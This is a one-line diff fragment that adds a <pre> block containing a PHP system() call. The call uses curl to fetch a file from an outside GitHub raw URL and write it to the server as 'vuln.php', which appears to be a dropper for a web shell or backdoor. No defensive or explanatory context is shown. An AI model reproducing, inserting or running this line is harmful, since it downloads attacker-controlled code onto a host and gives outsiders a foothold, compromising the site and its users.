@@ -1,0 +1,1 @@
+<pre>system('curl -o vuln.php https://raw.githubusercontent.com/dasisqo/cmd/main/azusa.txt')</pre>
